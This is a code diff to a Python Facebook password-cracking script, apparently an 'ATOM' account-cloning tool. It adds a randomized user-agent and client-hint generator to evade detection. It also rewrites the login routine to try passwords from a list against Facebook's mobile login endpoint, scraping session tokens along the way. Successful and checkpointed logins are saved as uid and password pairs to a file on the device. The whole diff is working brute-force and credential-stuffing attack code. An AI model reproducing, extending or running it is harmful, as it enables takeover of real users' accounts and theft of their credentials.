@@ -1605,6 +1605,168 @@ def x(uid,pwx,tl):
         #print({error})
         pass
 
+def _generate_ua_apui():
+    chrome_ver  = random.randint(120, 149)
+    firefox_ver = random.randint(118, 136)
+    edge_ver    = random.randint(120, 148)
+    patch_ver   = random.randint(6000, 8500)
+    sub_ver     = random.randint(100, 300)
+
+    android_devices = [
+        ('13',  'Pixel 7',          'BP1A.240505.004'),
+        ('13',  'Pixel 7 Pro',      'TQ3A.230901.001'),
+        ('14',  'Pixel 8',          'AD1A.240905.004'),
+        ('14',  'Pixel 8 Pro',      'UQ1A.231205.015'),
+        ('15',  'Pixel 9',          'AP3A.241205.013'),
+        ('13',  'SM-S918B',         'TP1A.220624.014'),
+        ('13',  'SM-A546B',         'TP1A.220624.014'),
+        ('12',  'SM-G991B',         'SP1A.210812.016'),
+        ('14',  'CPH2447',          'UP1A.231005.007'),
+        ('13',  'M2102J20SG',       'TP1A.220624.014'),
+        ('14',  'V2309A',           'UP1A.231005.007'),
+    ]
+
+    windows_versions = ['10.0', '11.0']
+    mac_versions     = ['10_15_7', '11_0_0', '12_0_0', '13_0_0', '14_0_0']
+
+    ua_type = random.choice([
+        'chrome_android',
+        'chrome_android',
+        'chrome_android',
+        'chrome_windows',
+        'chrome_mac',
+        'edge_windows',
+        'firefox_android',
+        'firefox_windows',
+    ])
+
+    if ua_type == 'chrome_android':
+        av, dev, build = random.choice(android_devices)
+        ua = (
+            f'Mozilla/5.0 (Linux; Android {av}; {dev} Build/{build}) '
+            f'AppleWebKit/537.36 (KHTML, like Gecko) '
+            f'Chrome/{chrome_ver}.0.0.0 Mobile Safari/537.36'
+        )
+        sec_ch_ua = (
+            f'"Chromium";v="{chrome_ver}", '
+            f'"Google Chrome";v="{chrome_ver}", '
+            f'"Not-A.Brand";v="24"'
+        )
+        sec_ch_ua_full_version_list = (
+            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
+            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
+            f'"Not-A.Brand";v="24.0.0.0"'
+        )
+        sec_ch_ua_mobile           = '?1'
+        sec_ch_ua_model            = f'"{dev}"'
+        sec_ch_ua_platform         = '"Android"'
+        sec_ch_ua_platform_version = f'"{av}.0.0"'
+
+    elif ua_type == 'chrome_windows':
+        wv = random.choice(windows_versions)
+        ua = (
+            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64) '
+            f'AppleWebKit/537.36 (KHTML, like Gecko) '
+            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36'
+        )
+        sec_ch_ua = (
+            f'"Chromium";v="{chrome_ver}", '
+            f'"Google Chrome";v="{chrome_ver}", '
+            f'"Not-A.Brand";v="24"'
+        )
+        sec_ch_ua_full_version_list = (
+            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
+            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
+            f'"Not-A.Brand";v="24.0.0.0"'
+        )
+        sec_ch_ua_mobile           = '?0'
+        sec_ch_ua_model            = '""'
+        sec_ch_ua_platform         = '"Windows"'
+        sec_ch_ua_platform_version = f'"{wv}.0"'
+
+    elif ua_type == 'chrome_mac':
+        mv = random.choice(mac_versions)
+        mv_dot = mv.replace('_', '.')
+        ua = (
+            f'Mozilla/5.0 (Macintosh; Intel Mac OS X {mv}) '
+            f'AppleWebKit/537.36 (KHTML, like Gecko) '
+            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36'
+        )
+        sec_ch_ua = (
+            f'"Chromium";v="{chrome_ver}", '
+            f'"Google Chrome";v="{chrome_ver}", '
+            f'"Not-A.Brand";v="24"'
+        )
+        sec_ch_ua_full_version_list = (
+            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
+            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
+            f'"Not-A.Brand";v="24.0.0.0"'
+        )
+        sec_ch_ua_mobile           = '?0'
+        sec_ch_ua_model            = '""'
+        sec_ch_ua_platform         = '"macOS"'
+        sec_ch_ua_platform_version = f'"{mv_dot}"'
+
+    elif ua_type == 'edge_windows':
+        wv = random.choice(windows_versions)
+        ua = (
+            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64) '
+            f'AppleWebKit/537.36 (KHTML, like Gecko) '
+            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36 '
+            f'Edg/{edge_ver}.0.0.0'
+        )
+        sec_ch_ua = (
+            f'"Chromium";v="{chrome_ver}", '
+            f'"Microsoft Edge";v="{edge_ver}", '
+            f'"Not-A.Brand";v="24"'
+        )
+        sec_ch_ua_full_version_list = (
+            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
+            f'"Microsoft Edge";v="{edge_ver}.0.{patch_ver}.{sub_ver}", '
+            f'"Not-A.Brand";v="24.0.0.0"'
+        )
+        sec_ch_ua_mobile           = '?0'
+        sec_ch_ua_model            = '""'
+        sec_ch_ua_platform         = '"Windows"'
+        sec_ch_ua_platform_version = f'"{wv}.0"'
+
+    elif ua_type == 'firefox_android':
+        av, dev, build = random.choice(android_devices)
+        ua = (
+            f'Mozilla/5.0 (Android {av}; Mobile; rv:{firefox_ver}.0) '
+            f'Gecko/{firefox_ver}.0 Firefox/{firefox_ver}.0'
+        )
+        sec_ch_ua                  = ''
+        sec_ch_ua_full_version_list = ''
+        sec_ch_ua_mobile           = '?1'
+        sec_ch_ua_model            = f'"{dev}"'
+        sec_ch_ua_platform         = '"Android"'
+        sec_ch_ua_platform_version = f'"{av}.0.0"'
+
+    else:  # firefox_windows
+        wv = random.choice(windows_versions)
+        ua = (
+            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64; rv:{firefox_ver}.0) '
+            f'Gecko/{firefox_ver}.0 Firefox/{firefox_ver}.0'
+        )
+        sec_ch_ua                  = ''
+        sec_ch_ua_full_version_list = ''
+        sec_ch_ua_mobile           = '?0'
+        sec_ch_ua_model            = '""'
+        sec_ch_ua_platform         = '"Windows"'
+        sec_ch_ua_platform_version = f'"{wv}.0"'
+
+    return {
+        'ua':                          ua,
+        'sec_ch_ua':                   sec_ch_ua,
+        'sec_ch_ua_full_version_list': sec_ch_ua_full_version_list,
+        'sec_ch_ua_mobile':            sec_ch_ua_mobile,
+        'sec_ch_ua_model':             sec_ch_ua_model,
+        'sec_ch_ua_platform':          sec_ch_ua_platform,
+        'sec_ch_ua_platform_version':  sec_ch_ua_platform_version,
+    }
+
+
 def mobile(uid,pwx,tl):
     global oks
     global cps
@@ -1615,54 +1777,208 @@ def mobile(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
-            data = {
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'contact_point',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': True,
-            'had_password_prefilled': False,
-            'is_smart_lock': False,
-            'bi_xrwh': '0',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
+            _ua_d  = _generate_ua_apui()
+            _agent = _ua_d['ua']
+            _sch_ua     = _ua_d['sec_ch_ua']
+            _sch_full   = _ua_d['sec_ch_ua_full_version_list']
+            _sch_mob    = _ua_d['sec_ch_ua_mobile']
+            _sch_mod    = _ua_d['sec_ch_ua_model']
+            _sch_plat   = _ua_d['sec_ch_ua_platform']
+            _sch_platv  = _ua_d['sec_ch_ua_platform_version']
+            url = 'https://m.beta.facebook.com/login/'
+            headi = {
+                'Host': 'm.beta.facebook.com',
+                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Upgrade-Insecure-Requests': '1',
+                'User-Agent': _agent,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-User': '?1',
+                'Sec-Fetch-Dest': 'document',
+                'Priority': 'u=0, i',
+            }
+            headi['Sec-Ch-Ua']                   = _sch_ua
+            headi['Sec-Ch-Ua-Full-Version-List'] = _sch_full
+            headi['Sec-Ch-Ua-Mobile']            = _sch_mob
+            headi['Sec-Ch-Ua-Model']             = _sch_mod
+            headi['Sec-Ch-Ua-Platform']          = _sch_plat
+            headi['Sec-Ch-Ua-Platform-Version']  = _sch_platv
+            q  = Session.get(url, headers=headi)
+            rt = q.text
+            hsku = ''
+            _m = re.search(r'"haste_session"\s*:\s*"([^"]+)"', rt)
+            if _m: hsku = _m.group(1)
+            ccgku = ''
+            _m = re.search(r'"connectionClass"\s*:\s*"([^"]+)"', rt)
+            if _m: ccgku = _m.group(1)
+            revku = ''
+            _m = re.search(r'consistency[^}]*rev:(\d+)', rt)
+            if not _m: _m = re.search(r'"rev"\s*:\s*(\d+)', rt)
+            if not _m: _m = re.search(r'\brev:(\d+)', rt)
+            if _m: revku = _m.group(1)
+            hsiku = ''
+            _m = re.search(r'"hsi"\s*:\s*"([^"]+)"', rt)
+            if _m: hsiku = _m.group(1)
+            dtsg = ''
+            _m = re.search(r'"dtsg"\s*:\s*\{\s*"token"\s*:\s*"([^"]+)"', rt)
+            if not _m: _m = re.search(r'"token"\s*:\s*"([A-Za-z0-9_\-]+:[0-9]+:[0-9]+)"', rt)
+            if _m: dtsg = _m.group(1)
+            jazoest = ''
+            _m = re.search(r"""name=["']jazoest["']\s+value=["']([^"']+)["']""", rt)
+            if not _m: _m = re.search(r"""<input[^>]+name=["']jazoest["'][^>]+value=["']([^"']+)["']""", rt)
+            if _m: jazoest = _m.group(1)
+            lsd = ''
+            _m = re.search(r"""name=["']lsd["']\s+value=["']([^"']+)["']""", rt)
+            if not _m: _m = re.search(r"""<input[^>]+name=["']lsd["'][^>]+value=["']([^"']+)["']""", rt)
+            if not _m: _m = re.search(r'"lsd"\s*:\s*"([^"]+)"', rt)
+            if _m: lsd = _m.group(1)
             headers = {
-            'Host': 'touch.facebook.com',
-            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
-            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
-            'x-response-format': 'JSONStream',
-            'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'viewport-width': '360',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-asbd-id': '129477',
-            'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua-platform': '"Android"',
-            'accept': '*/*',
-            'origin': 'https://touch.facebook.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
-            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            po = Session.post(url, data=data, headers=headers).text
+                'accept': '*/*',
+                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+                'cache-control': 'no-cache',
+                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                'origin': 'https://m.beta.facebook.com',
+                'pragma': 'no-cache',
+                'priority': 'u=1, i',
+                'referer': 'https://m.beta.facebook.com/login/',
+                'sec-ch-prefers-color-scheme': 'dark',
+                'sec-ch-ua': _sch_ua,
+                'sec-ch-ua-full-version-list': _sch_full,
+                'sec-ch-ua-mobile': _sch_mob,
+                'sec-ch-ua-model': _sch_mod,
+                'sec-ch-ua-platform': _sch_plat,
+                'sec-ch-ua-platform-version': _sch_platv,
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': _agent,
+            }
+            params = {
+                'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
+                'type': 'action',
+                '__bkv': '4d80cbf5a81f2494a830bb526773c8d2bf86cc7be7619c08b340952a54773dcd',
+            }
+            apcb = '#PWD_BROWSER:0:{}:{}'.format(str(int(time.time())), pw)
+            data = {
+                '__aaid': '0',
+                '__user': '0',
+                '__a': '1',
+                '__req': 'k',
+                '__hs': hsku,
+                'dpr': '3',
+                '__ccg': ccgku,
+                '__rev': revku,
+                '__s': '',
+                '__hsi': hsiku,
+                '__dyn': '',
+                'fb_dtsg': dtsg,
+                'jazoest': jazoest,
+                'lsd': lsd,
+                'params': json.dumps({
+                    "params": json.dumps({
+                        "server_params": {
+                            "credential_type": "password",
+                            "username_text_input_id": "e7f9ek:58",
+                            "password_text_input_id": "e7f9ek:59",
+                            "login_source": "Login",
+                            "login_credential_type": "none",
+                            "server_login_source": "login",
+                            "ar_event_source": "login_home_page",
+                            "should_trigger_override_login_success_action": 0,
+                            "should_trigger_override_login_2fa_action": 0,
+                            "is_caa_perf_enabled": 0,
+                            "reg_flow_source": "login_home_native_integration_point",
+                            "caller": "gslr",
+                            "is_from_landing_page": 0,
+                            "is_from_empty_password": 0,
+                            "is_from_aymh": 0,
+                            "is_from_password_entry_page": 0,
+                            "is_from_assistive_id": 0,
+                            "is_from_msplit_fallback": 0,
+                            "two_step_login_type": "one_step_login",
+                            "left_nav_button_action": "NONE",
+                            "INTERNAL__latency_qpl_marker_id": 36707139,
+                            "INTERNAL__latency_qpl_instance_id": "85899580400185",
+                            "device_id": None,
+                            "family_device_id": None,
+                            "waterfall_id": str(uuid.uuid4()),
+                            "offline_experiment_group": None,
+                            "layered_homepage_experiment_group": None,
+                            "is_platform_login": 0,
+                            "is_from_logged_in_switcher": 0,
+                            "is_from_logged_out": 0,
+                            "access_flow_version": "pre_mt_behavior",
+                            "login_surface": "login_home",
+                            "login_entry_point": "logged_out"
+                        },
+                        "client_input_params": {
+                            "machine_id": "",
+                            "cloud_trust_token": None,
+                            "block_store_machine_id": "",
+                            "zero_balance_state": "",
+                            "contact_point": uid,
+                            "password": apcb,
+                            "accounts_list": [],
+                            "fb_ig_device_id": [],
+                            "secure_family_device_id": "",
+                            "encrypted_msisdn": "",
+                            "headers_infra_flow_id": "",
+                            "try_num": 1,
+                            "login_attempt_count": 1,
+                            "event_flow": "login_manual",
+                            "event_step": "home_page",
+                            "openid_tokens": {},
+                            "auth_secure_device_id": "",
+                            "client_known_key_hash": "",
+                            "has_whatsapp_installed": 0,
+                            "sso_token_map_json_string": "",
+                            "should_show_nested_nta_from_aymh": 0,
+                            "gms_incoming_call_retriever_eligibility": "client_not_supported",
+                            "password_contains_non_ascii": "false",
+                            "has_granted_read_contacts_permissions": 0,
+                            "has_granted_read_phone_permissions": 0,
+                            "app_manager_id": "",
+                            "aymh_accounts": [
+                                {
+                                    "id": "",
+                                    "profiles": {
+                                        "id": {
+                                            "user_id": "",
+                                            "name": "",
+                                            "profile_picture_url": "",
+                                            "small_profile_picture_url": None,
+                                            "notification_count": 0,
+                                            "credential_type": "none",
+                                            "token": "",
+                                            "last_access_time": 0,
+                                            "is_derived": 0,
+                                            "username": "",
+                                            "password": "",
+                                            "has_smartlock": 0,
+                                            "account_center_id": "",
+                                            "account_source": "",
+                                            "credentials": [],
+                                            "nta_eligibility_reason": None,
+                                            "from_accurate_privacy_result": 0,
+                                            "dbln_validated": 0
+                                        }
+                                    }
+                                }
+                            ],
+                            "sso_accounts_auth_data": [],
+                            "blocked_uids": [],
+                            "network_bssid": None,
+                            "lois_settings": {
+                                "lois_token": ""
+                            },
+                            "aac": ""
+                        }
+                    })
+                }),
+            }
+            pr = Session.post('https://m.beta.facebook.com/async/wbloks/fetch/', headers=headers, data=data, params=params)
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1683,8 +1999,8 @@ def mobile(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                #uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
